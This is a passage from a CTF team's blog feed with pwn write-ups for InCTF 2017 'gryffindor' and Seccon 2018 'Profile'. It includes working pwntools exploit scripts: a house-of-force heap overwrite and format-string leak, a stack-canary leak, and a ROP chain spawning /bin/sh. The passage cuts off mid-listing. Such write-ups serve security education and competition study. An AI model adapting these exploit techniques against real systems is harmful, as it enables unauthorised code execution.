class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_g</span><span class="params">(size, index)</span>:</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(size)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_g</span><span class="params">(size, index, inp, choice=<span class="string">'3'</span>)</span>:</span></span><br><span class="line"><span class="keyword">if</span> choice == <span class="string">'3'</span>:</span><br><span class="line">        r.recv()</span><br><span class="line">r.sendline(choice)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r.send(choice)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(index)</span><br><span class="line">r.recv()</span><br><span class="line"><span class="keyword">if</span> choice == <span class="string">'3'</span>:</span><br><span class="line">r.sendline(size)</span><br><span class="line">r.sendline(inp)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r.send(size)</span><br><span class="line">r.sendline(inp)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print sys.path[0]</span></span><br><span class="line"><span class="comment">#exit(0)</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">binary = ELF(<span class="string">'./gryffindor'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">r = process(<span class="string">'./gryffindor'</span>, env=&#123;<span class="string">'LD_LIBRARY_PATH'</span>: os.path.join(os.getcwd(),<span class="string">"./libc.so.6"</span>)+<span class="string">" "</span>+sys.path[<span class="number">0</span>]&#125;)</span><br><span class="line"><span class="comment">#gdb.attach(r, """</span></span><br><span class="line"><span class="comment">#b *0x400af0</span></span><br><span class="line"><span class="comment">#""")</span></span><br><span class="line"><span class="comment">#b *0x400bd9</span></span><br><span class="line"><span class="comment">#       b *0x400BCD</span></span><br><span class="line"><span class="comment">#""")</span></span><br><span class="line"><span class="comment">#       b *0x400BB5</span></span><br><span class="line"><span class="comment">#b *0x400989</span></span><br><span class="line"><span class="comment">#b *0x400bd9</span></span><br><span class="line"><span class="comment">#b *0x400BD9</span></span><br><span class="line"><span class="comment">#""")</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'1337'</span>)</span><br><span class="line">heap = int(r.recv(<span class="number">9</span>),<span class="number">16</span>)+<span class="number">0x1b0</span></span><br><span class="line">log.info(<span class="string">'[X] LEAKED HEAP 0x%x'</span> % (heap))</span><br><span class="line"><span class="comment">###############################################################################</span></span><br><span class="line"><span class="comment"># HOUSE OF FORCE - Replace atoi with printf to gain format string vulnerability</span></span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'0'</span>)</span><br><span class="line">edit_g(str(<span class="number">18</span>*<span class="number">8</span>), <span class="string">'0'</span>,<span class="string">'A'</span>*<span class="number">17</span>*<span class="number">8</span> + p64(<span class="number">-1</span>,signed=<span class="keyword">True</span>))</span><br><span class="line">add_g(str(binary.got[<span class="string">'atoll'</span>]-heap), <span class="string">'1'</span>)</span><br><span class="line">add_g(<span class="string">'130'</span>, <span class="string">'2'</span>)</span><br><span class="line">edit_g(<span class="string">'130'</span>, <span class="string">'2'</span>, p64(binary.plt[<span class="string">'atoll'</span>]+<span class="number">6</span>) +</span><br><span class="line">p64(binary.plt[<span class="string">'malloc'</span>]+<span class="number">6</span>) +</span><br><span class="line">p64(binary.plt[<span class="string">'setvbuf'</span>]+<span class="number">6</span>) +</span><br><span class="line">p64(binary.plt[<span class="string">'printf'</span>]+<span class="number">6</span>))</span><br><span class="line"><span class="comment">#edit_g('130', '2', p64(binary.plt['read']+6))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment"># LEAK LIBC</span></span><br><span class="line">r.recv()</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">'%p %p %p'</span>)</span><br><span class="line">s = r.recv()</span><br><span class="line">list_addr = s.split(<span class="string">' '</span>)</span><br><span class="line">STACK_ADDRESS = int(list_addr[<span class="number">0</span>],<span class="number">16</span>)+<span class="number">168</span></span><br><span class="line">leaked = int(list_addr[<span class="number">2</span>][:<span class="number">-8</span>].rstrip(),<span class="number">16</span>)</span><br><span class="line">LIBC_BASE = leaked<span class="number">-0xf7260</span></span><br><span class="line">SYSTEM = LIBC_BASE + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">ONE_GADGET = LIBC_BASE + <span class="number">0xf1117</span></span><br><span class="line"></span><br><span class="line">ONE_GADGET_LOW = ONE_GADGET &amp; <span class="number">0xffffffff</span></span><br><span class="line">ONE_GADGET_HIGH = (ONE_GADGET &amp; <span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">log.info(<span class="string">'[X] LEAKED 0x%x'</span> % (leaked))</span><br><span class="line">log.info(<span class="string">'[X] LEAKED LIBC_BASE 0x%x'</span> % LIBC_BASE)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED STACK_ADDRESS 0x%x'</span> % STACK_ADDRESS)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED SYSTEM 0x%x'</span> % SYSTEM)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED LOW_ONE_GADGET 0x%x'</span> % ONE_GADGET_LOW)</span><br><span class="line">log.info(<span class="string">'[X] LEAKED HIGH_ONE_GADGET 0x%x'</span> % ONE_GADGET_HIGH)</span><br><span class="line"><span class="comment">#exit(0)</span></span><br><span class="line"><span class="comment">####################################################</span></span><br><span class="line"><span class="comment"># Replace exit got with one_gadget using format string</span></span><br><span class="line">rop = p64(binary.plt[<span class="string">'atoll'</span>]+<span class="number">6</span>) + \</span><br><span class="line">p64(binary.plt[<span class="string">'malloc'</span>]+<span class="number">6</span>) + \</span><br><span class="line">    p64(binary.plt[<span class="string">'setvbuf'</span>]+<span class="number">6</span>) + \</span><br><span class="line">    p64(SYSTEM)</span><br><span class="line">edit_g(<span class="string">'A'</span>*<span class="number">31</span>+<span class="string">'\x00'</span>, <span class="string">'22\x00'</span>, rop, choice=<span class="string">'111\x00'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">r.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#r.recvuntil('&gt;&gt;')</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://theswissbay.ch/pdf/_to_sort/heap-exploitation.pdf" target="_blank" rel="noopener">https://theswissbay.ch/pdf/_to_sort/heap-exploitation.pdf</a></li><li><a href="https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/" target="_blank" rel="noopener">https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://mega.nz/#!XvInEABK!7R3-Hbl7dGY-7FGVuTxP25NkQfd5OQBn6P9thxk3l7U&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;gryffindor&lt;/a&gt;&lt;br&gt;&lt;a href
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="House of Force" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/House-of-Force/"/>
    
      <category term="Heap Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Heap-Overflow/"/>
    
      <category term="Format String" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"/>
    
    
      <category term="format_string" scheme="https://teamrocketist.github.io/tags/format-string/"/>
    
      <category term="heap_overflow" scheme="https://teamrocketist.github.io/tags/heap-overflow/"/>
    
      <category term="inctf2017" scheme="https://teamrocketist.github.io/tags/inctf2017/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Seccon 2018 - Profile</title>
    <link href="https://teamrocketist.github.io/2018/11/04/Pwn-Seccon-2018-Profile/"/>
    <id>https://teamrocketist.github.io/2018/11/04/Pwn-Seccon-2018-Profile/</id>
    <published>2018-11-04T16:46:32.000Z</published>
    <updated>2018-11-06T03:57:42.860Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Profile<br>255<br>64 Solves<br>Host: profile.pwn.seccon.jp<br>Port: 28553<br>profile_e814c1a78e80ed250c17e94585224b3f3be9d383<br>libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253</p></blockquote><p>We have a 64 bit binary, we can start by checking it’s security with <a href="http://docs.pwntools.com/en/stable/commandline.html?highlight=checksec#pwn-checksec" target="_blank" rel="noopener">checksec</a>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec profile_e814c1a78e80ed250c17e94585224b3f3be9d383 </span><br><span class="line">[*] <span class="string">'/ctf/work/ctf/seccon2018/pwn/profile/profile_e814c1a78e80ed250c17e94585224b3f3be9d383'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h2 id="ELF-protections-and-how-to-bypass-them"><a href="#ELF-protections-and-how-to-bypass-them" class="headerlink" title="ELF protections and how to bypass them:"></a>ELF protections and how to bypass them:</h2><p><strong>NX (Non-executable stack)</strong> this can be circumvented using <strong>ROP</strong> (Return oriented programming).  </p><p><strong>Partial RELRO</strong> makes almost no difference, other than it forces the <strong>GOT</strong> to come before the <strong>BSS</strong> in memory, eliminating the risk of a buffer overflows on a global variable <strong>overwriting</strong> GOT entries.</p><p><strong>Stack Canary</strong> random value positioned just before the <strong>saved ebp</strong> and the <strong>return address</strong>, if this value is somehow changed for example with a buffer overflow, the program throws an exception preventing an attack, one way to bypass this is by finding a way to <strong>leak addresses</strong> from the stack , the value we want is obviously the canary itself.</p><h2 id="Finding-a-way-to-leak-addresses"><a href="#Finding-a-way-to-leak-addresses" class="headerlink" title="Finding a way to leak addresses"></a>Finding a way to leak addresses</h2><p>Resuming a little bit what the program does, we can create a profile with the specific fields <strong>name</strong>, <strong>age</strong> and <strong>message</strong>, later on we are presented a menu where we can update our message, print our profile and exit.</p><p>The profile creation part in the beginning doesn’t seem to have any kind of vulnerability, the strings are being created with <strong>std::string</strong> which is being defined using the <strong>std::basic_string</strong> class template, which has three template parameters, on ida a <strong>std::string</strong> shows up like this:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(&amp;v14, argv);</span><br></pre></td></tr></table></figure><p><a data-fancybox="gallery" href="https://i.imgur.com/v7VS7kx.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/v7VS7kx.png" alt=""><br></a></p><p>Nothing seems wrong in here, we have a lot of string declarations with <strong>std::string</strong>, the input reading from the user <strong>cin</strong> class from c++ which is fine against overflows.</p><p>The only thing left now is the methods of the class profile <strong>Profile::update_msg</strong> and <strong>Profile::show</strong>, so just by reading the names of this methods we can already deduce what is going to happen, <strong>update_msg</strong> is probably where we are going to find some kind of <strong>overflow</strong> (receives user input to update profile msg), and on <strong>show</strong> is probably where we are going to <strong>leak addresses</strong> from memory, because it involves printing fields from our class object profile.</p><h3 id="Profile-update-msg"><a href="#Profile-update-msg" class="headerlink" title="Profile::update_msg"></a>Profile::update_msg</h3><p>Once again <strong>std::string</strong> is being used, one particular optimization of the <strong>std::string</strong> object is when receives small strings it creates <strong>small buffer</strong>, which saves <strong>dynamic allocations</strong>. Which means, when small strings are passed to the constructor (len &lt; 16) it string is stored in the <strong>stack</strong> instead of allocating on the heap, we can verify this easily if we create a c++ program and modify the new constructor to print some debugging :</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// replace operator new and delete to log allocations</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="built_in">std</span>::<span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"[Allocating "</span> &lt;&lt; n &lt;&lt; <span class="string">" bytes]"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">malloc</span>(n);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">void</span>* p)</span> <span class="title">throw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">": "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">string</span>(i, <span class="string">'='</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The output</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0:</span><br><span class="line">1: =</span><br><span class="line">2: ==</span><br><span class="line">3: ===</span><br><span class="line">4: ====</span><br><span class="line">5: =====</span><br><span class="line">6: ======</span><br><span class="line">7: =======</span><br><span class="line">8: ========</span><br><span class="line">9: =========</span><br><span class="line">10: ==========</span><br><span class="line">11: ===========</span><br><span class="line">12: ============</span><br><span class="line">13: =============</span><br><span class="line">14: ==============</span><br><span class="line">15: ===============</span><br><span class="line">[Allocating 32 bytes]16: ================</span><br><span class="line">[Allocating 32 bytes]17: =================</span><br><span class="line">[Allocating 32 bytes]18: ==================</span><br><span class="line">[Allocating 32 bytes]19: ===================</span><br><span class="line">[Allocating 32 bytes]20: ====================</span><br><span class="line">[Allocating 32 bytes]21: =====================</span><br><span class="line">[Allocating 32 bytes]22: ======================</span><br><span class="line">[Allocating 32 bytes]23: =======================</span><br></pre></td></tr></table></figure><p>Now looking at the code right after the declaration of <strong>std:string</strong> a function named <strong>MALLOC_USABLE_SIZE</strong> according to the man pages it says it obtains size of block of memory allocated from <strong><em>heap</em></strong> , but what happens if nothing we pass a pointer from the stack? the unexpected will happen this function will return -8 (0xfffffffffffffff8), this value <strong>won’t</strong> be interpreted as <strong>negative</strong> but as a very <strong>high</strong> number because the variables are declared as <strong>unsigned ints</strong>, this will later be passed to the stop loop condition of  <strong>getn</strong> function, entering into a infinite loop and only stops when a new line (0xa) is found which will lead to a buffer overflow.</p><p>UpdateMessage function<br><a data-fancybox="gallery" href="https://i.imgur.com/MNcth1P.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/MNcth1P.png" alt=""><br></a></p><p>getn function<br><a data-fancybox="gallery" href="https://i.imgur.com/KZZH881.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KZZH881.png" alt=""><br></a></p><p>On GDB after <strong>MALLOC_USABLE_SIZE</strong>, the value is returned into <strong>rax</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/ziYa5dp.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ziYa5dp.png" alt=""><br></a></p><p>Now if we do some testing to check what is in the stack after we use update message with 8<em>‘A’ and 8</em>‘B’:  </p><p>The values from the stack<br><a data-fancybox="gallery" href="https://i.imgur.com/G0WEEIa.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/G0WEEIa.png" alt=""><br></a></p><p>Some gdb commands that might help you finding the <strong>stack canary</strong> and <strong>ret addr</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/8m0MzpC.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/8m0MzpC.png" alt=""><br></a></p><p>Leaking the <strong>libc</strong> is easy, we just need to set a got address to leak it, but how do we leak the <strong>canary</strong>? We need to find a way to leak an address from the stack, having this we can calculate its offset to the canary address, but how do we do this? we can take <strong>advantage</strong> of the fact that we have a <strong>large part</strong> of the address of the pointer to profile.name, if we only modify the <strong>last byte</strong> of the <strong>pointer of profile.name</strong> and we just need to keep iterating from <strong>0x00</strong> to <strong>0xff</strong> until we reach the address of the string that we inserted 0x4141414141414141, after that it is a matter of only adding another 0x10 and we can expose that address of the stack, getting this we just need to do the difference between this address and the canary.</p><p>The leaked values will show up after “Name: “, because we are changing the value of the pointer to profile.name in the stack! with this if we print the profile, the profile.name will print the pointer we changed…</p><p>Part of the code to calculate this offset:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="comment">#d = os.environ</span></span><br><span class="line">        <span class="comment">#d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'</span></span><br><span class="line">        <span class="keyword">return</span> process(filename, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.23'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakAddr</span><span class="params">(addr, bytes_to_read=<span class="number">6</span>)</span>:</span></span><br><span class="line">        r.recv()</span><br><span class="line">        r.sendline(<span class="string">'1'</span>)</span><br><span class="line">        r.recv()</span><br><span class="line">        r.sendline(<span class="string">'A'</span>*<span class="number">8</span> + <span class="string">'B'</span>*<span class="number">8</span> + addr)</span><br><span class="line">        r.recv()</span><br><span class="line">        r.sendline(<span class="string">'2'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'Name : '</span>)</span><br><span class="line">        <span class="keyword">return</span> u64(r.recv(bytes_to_read).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">filename = <span class="string">'./profile_e814c1a78e80ed250c17e94585224b3f3be9d383'</span></span><br><span class="line">host = <span class="string">'profile.pwn.seccon.jp'</span></span><br><span class="line">port = <span class="number">28553</span></span><br><span class="line">local = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">binary = ELF(filename)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.23'</span>)</span><br><span class="line"></span><br><span class="line">POPRET = <span class="number">0x401713</span></span><br><span class="line"></span><br><span class="line">LEAKED_ADDR = <span class="number">0x0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">r = getConn()</span><br><span class="line">gdb.attach(r, <span class="string">'''</span></span><br><span class="line"><span class="string">   b *0x4011e1</span></span><br><span class="line"><span class="string">   b *0x4013C9</span></span><br><span class="line"><span class="string">   b *0x40148D</span></span><br><span class="line"><span class="string">   '''</span>)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'2'</span>*<span class="number">15</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'3'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'4'</span>)</span><br><span class="line">log.info(<span class="string">'----------Searching for the offset-------------'</span>) </span><br><span class="line"><span class="keyword">while</span> LEAKED_ADDR != <span class="number">0x414141414141</span> <span class="keyword">and</span> i &lt; <span class="number">0xff</span>:</span><br><span class="line">        LEAKED_ADDR = leakAddr(p8(i))</span><br><span class="line">        log.info(<span class="string">"LEAKED ADDR 0x%x 0x%x"</span> % (LEAKED_ADDR,i))</span><br><span class="line">        i += <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">0xff</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Unluckly couldn\'t find the string position'</span></span><br><span class="line">        r.close()</span><br><span class="line">        exit(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">LEAKED_ADDR = leakAddr(p8(i))</span><br><span class="line">log.info(<span class="string">'------------------Offset Found-----------------'</span>)</span><br><span class="line"></span><br><span class="line">CANARY_ADDR = LEAKED_ADDR+<span class="number">0x28</span></span><br><span class="line">log.info(<span class="string">"LEAKED ADDR 0x%x"</span> % LEAKED_ADDR)</span><br><span class="line">log.info(<span class="string">"CANARY ADDR 0x%x"</span> % (CANARY_ADDR))</span><br><span class="line">CANARY = leakAddr(p64(CANARY_ADDR) ,bytes_to_read=<span class="number">8</span>)</span><br><span class="line">log.info(<span class="string">"Canary 0x%x"</span> % CANARY)</span><br></pre></td></tr></table></figure></p><h2 id="Leaking-libc"><a href="#Leaking-libc" class="headerlink" title="Leaking libc"></a>Leaking libc</h2><p>Now that we have the stack canary we can easily leak libc, we don’t even need to calculate offsets we just need to use the global offset table, we can use the GOT entry of <strong>read</strong>, and then calculate the offsets with the help of pwntools since we are loading the libc file in the beginning:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">READ = leakAddr(p64(binary.got[<span class="string">'read'</span>]))</span><br><span class="line">LIBCBASE = READ - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">BINSH = LIBCBASE + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">EXIT = LIBCBASE + libc.symbols[<span class="string">'exit'</span>]</span><br><span class="line">log.info(<span class="string">"READ 0x%x"</span> % READ)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</span><br><span class="line">log.info(<span class="string">"BINSH 0x%x"</span> % BINSH)</span><br></pre></td></tr></table></figure><p>Now that we have all the libc we just need to build our rop chain, we need to find a gadget that puts <strong>/bin/sh</strong> into rdi, we can do this with <strong>POP RDI ; RET</strong> which will get the value in the top of the stack into RDI, after this we can call system, for a more detailed description you can read this <a href="https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/">write up</a> on about to write a ropchain (it’s a little different because on this link the binary is statically linked instead of dynamically).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ropchain = <span class="string">''</span></span><br><span class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></span><br><span class="line">ropchain += p64(BINSH) <span class="comment"># BINSH ADDRESS ARG[1]</span></span><br><span class="line">ropchain += p64(SYSTEM) <span class="comment"># SYSTEM function "call"</span></span><br><span class="line"></span><br><span class="line">ropchain += p64(EXIT) <span class="comment"># EXIT Actually useless you don't really</span></span><br><span class="line"><span class="comment">#                       need to exit, but I usually like to exit without an error</span></span><br></pre></td></tr></table></figure><p>And now that we have everything we can calculate the final offsets:<br><a data-fancybox="gallery" href="https://i.imgur.com/qf4bPYj.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/qf4bPYj.png" alt=""><br></a><br>The rest of the code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(p64(<span class="number">0</span>) * <span class="number">7</span> + p64(CANARY) + p64(<span class="number">0</span>)*<span class="number">3</span> + ropchain)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'0'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>The full code exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 